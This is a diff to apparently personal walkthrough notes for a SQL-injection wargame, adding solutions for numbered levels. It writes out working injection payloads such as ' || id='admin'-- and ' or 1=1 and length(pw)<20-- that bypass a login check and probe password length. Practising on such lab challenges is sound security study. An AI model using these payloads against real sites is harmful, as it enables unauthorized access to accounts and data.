@@ -31,7 +31,7 @@ level-5 (wolfman):
 
 level-6 (darkelf):
   -> inspect the page and in the url add parameter named pw.
-  -> where pw=' || id='admin'--  .("||"  it is logical operator or.)
+  -> where pw=' || id='admin'--  .("||"  it is represented as or.)
   -> the level is cleared.
 
 level-7 (orge):
@@ -57,6 +57,13 @@ level-9 (vampire):
   -> the level is cleared..
 
 level-10 (skeleton):
+  -> inspect the page and add a parameter named id.
+  -> where id= 123' or id='admin' and 1=1--  ( anything can be inserted in place of 123 and or id=admin and 1=1--  return always true.)
+  -> another way is 
+  -> where id=' or 1=1 and length(pw)<20--  ( since the condition is true it reurns a row in which the id has the length of the pass less than 20.)
+  -> the level is cleared.
+
+level-11 (golem):
   -> 
 
 
